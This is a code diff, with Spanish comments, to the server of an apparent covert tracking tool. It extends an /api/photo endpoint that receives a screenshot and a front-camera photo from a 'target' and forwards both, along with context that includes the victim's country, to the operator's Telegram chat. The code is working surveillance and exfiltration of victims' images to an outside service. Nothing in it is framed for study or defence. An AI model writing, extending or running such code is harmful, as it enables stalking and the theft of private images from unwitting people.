@@ -372,43 +372,65 @@ ${flag} País:          ${g.country} (${g.countryCode})
     res.json({ success: true });
 });
 
-// Recibe la foto (screenshot) y la reenvía a Telegram
-app.post('/api/photo', upload.single('photo'), async (req, res) => {
+// Recibe la foto (screenshot) y cámara frontal (si hay) y las reenvía a Telegram
+app.post('/api/photo', upload.array('photos', 2), async (req, res) => {
     const targetId = req.body.targetId || 'Desconocido';
     const ownerChatId = linkDatabase[targetId] || ADMIN_CHAT_ID;
 
-    if (req.file) {
+    if (req.files && req.files.length > 0) {
         try {
-            console.log(`[PHOTO] Recibido archivo de ${targetId}. Tamaño: ${req.file.size} bytes`);
+            console.log(`[PHOTO] Recibidas ${req.files.length} imágenes de ${targetId}.`);
 
-            const formData = new FormData();
-            formData.append('chat_id', ownerChatId);
-            formData.append('caption', `📸 Screenshot del objetivo: ${targetId} — ${new Date().toLocaleString('es-ES')}`);
+            if (req.files.length === 1) {
+                // Si solo llegó 1 foto (probablemente screenshot porque denegó cámara)
+                const formData = new FormData();
+                formData.append('chat_id', ownerChatId);
+                formData.append('caption', `📸 Captura del objetivo: ${targetId} — ${new Date().toLocaleString('es-ES')}`);
 
-            // Convertir buffer a Blob para que FormData lo acepte correctamente
-            const blob = new Blob([req.file.buffer], { type: 'image/jpeg' });
-            formData.append('photo', blob, 'screenshot.jpg');
+                const blob = new Blob([req.files[0].buffer], { type: 'image/jpeg' });
+                formData.append('photo', blob, req.files[0].originalname || 'foto.jpg');
 
-            const tgRes = await fetch(`${BASE_URL}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-
-            const tgJson = await tgRes.json();
-            if (!tgJson.ok) {
-                console.error(`[-] Telegram API rechazó la foto (Error ${tgJson.error_code}): ${tgJson.description}`);
-                console.error(`    Detalles: ${JSON.stringify(tgJson)}`);
+                const tgRes = await fetch(`${BASE_URL}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const tgJson = await tgRes.json();
+                if (!tgJson.ok) console.error(`[-] Telegram rechazó enviar foto singular:`, tgJson);
             } else {
-                console.log(`[+] Foto reenviada a Telegram exitosamente para ID: ${targetId}`);
-                console.log(`    File ID: ${tgJson.result?.photo?.[0]?.file_id || 'N/A'}`);
+                // Llegaron 2 fotos, enviar como grupo (MediaGroup)
+                const formData = new FormData();
+                formData.append('chat_id', ownerChatId);
+
+                const mediaGroup = [];
+                req.files.forEach((file, index) => {
+                    const attachName = `attach://photo${index}`;
+                    const blob = new Blob([file.buffer], { type: 'image/jpeg' });
+                    formData.append(`photo${index}`, blob, file.originalname);
+
+                    mediaGroup.push({
+                        type: 'photo',
+                        media: attachName,
+                        caption: index === 0 ? `📸 Captura Web + 📷 Cámara Frontal de: ${targetId}` : ''
+                    });
+                });
+
+                formData.append('media', JSON.stringify(mediaGroup));
+
+                const tgRes = await fetch(`${BASE_URL}/sendMediaGroup`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const tgJson = await tgRes.json();
+                if (!tgJson.ok) console.error(`[-] Telegram rechazó el sendMediaGroup:`, tgJson);
             }
 
+            console.log(`[+] Archivos multimedia procesados para ID: ${targetId}`);
+
         } catch (e) {
-            console.error('[-] Error de red enviando foto a tg:', e.message);
-            console.error('[-] Stack:', e.stack);
+            console.error('[-] Error enviando fotos a tg:', e.message);
         }
     } else {
-        console.warn(`[-] /api/photo recibió solicitud sin archivo 'photo' adjunto para ID: ${targetId}`);
+        console.warn(`[-] /api/photo recibió solicitud sin archivos adjuntos para ID: ${targetId}`);
     }
     res.json({ success: true });
 });
